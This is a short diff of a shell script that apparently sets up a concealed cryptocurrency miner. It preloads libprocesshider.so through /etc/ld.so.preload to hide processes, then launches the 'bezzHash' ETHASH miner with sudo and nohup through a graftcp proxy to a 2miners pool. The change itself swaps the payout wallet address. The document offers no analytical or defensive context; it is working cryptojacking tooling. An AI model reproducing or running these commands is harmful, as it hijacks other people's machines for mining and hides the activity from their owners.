@@ -62,4 +62,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-sudo nohup ./graftcp/graftcp ./bezzHash --algo ETHASH -p stratum+ssl://eth.2miners.com:12020 --user nano_1jrxbtt3rp6pd8ni7nym3ns3b3docfe6shxt7km6mt8kmt17orchabz9zu18.$(echo $(shuf -i 1-9999 -n 1)-asu) --ethstratum ETHV1 nohup.out
+sudo nohup ./graftcp/graftcp ./bezzHash --algo ETHASH -p stratum+ssl://eth.2miners.com:12020 --user nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe.$(echo $(shuf -i 1-9999 -n 1)-asu) --ethstratum ETHV1 nohup.out
